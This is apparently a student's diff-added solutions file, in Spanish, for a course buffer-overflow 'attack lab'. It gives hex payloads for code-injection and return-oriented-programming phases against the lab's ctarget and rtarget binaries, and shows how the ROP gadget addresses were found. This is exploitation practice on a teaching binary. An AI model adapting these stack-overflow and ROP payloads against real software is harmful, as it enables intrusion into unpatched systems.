@@ -1,0 +1,70 @@
+Realizado en Arch Linux.
+
+Como dar las soluciones:
+cat phase1.txt | ./hex2raw | ./ctarget -q
+cat phase2.txt | ./hex2raw | ./ctarget -q
+cat phase3.txt | ./hex2raw | ./ctarget -q
+cat phase4.txt | ./hex2raw | ./rtarget -q
+cat phase5.txt | ./hex2raw | ./rtarget -q
+
+
+
+
+1.phase1
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+a4 1c 40 00 00 00 00 00 -> Direccion del touch 1
+
+
+2.
+
+48 c7 c7 f8 4f bf 5f 68 -> Cookie
+de 1c 40 00 c3 00 00 00 -> Push dir memoria touch2
+00 00 00 00 00 00 00 00 
+98 1c 68 55 00 00 00 00 -> Return address rsp 
+
+
+3. 
+
+
+
+
+
+
+4.
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 -> buffer
+c5 1e 40 00 00 00 00 00 -> gadget 1
+f8 4f bf 5f 00 00 00 00 -> galleta
+a9 1e 40 00 00 00 00 00 -> gadget 2
+de 1c 40 00 00 00 00 00 -> touch 2
+
+Para consegui gadget 1:
+1. Se busca un 58, c3
+en 0x401ec2 hay un 58 c3, entonces
+
+0000000000401ec2 <getval_366>:
+  401ec2:	b8 3e 2b 58 90       	mov    $0x90582b3e,%eax
+  401ec7:	c3                   	ret
+
+
+hay un offset de 3
+
+entonces 0x401ec2 + 0x3 = 0x 401EC5
+little endian:40 1E C5 -> c5 1e 40 == gadget 1
+
+Para conseguir gadget 2:
+1. Se busca 48 89 c7 c3 
+
+0000000000401ea7 <addval_135>:
+  401ea7:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  401ead:	c3  
+
+Se le suma el offset, que en este caso es 0x2
+
+entonces 401ea7 + 0x2 = 40 1E A9
+
+little endian  = a9 1e 40
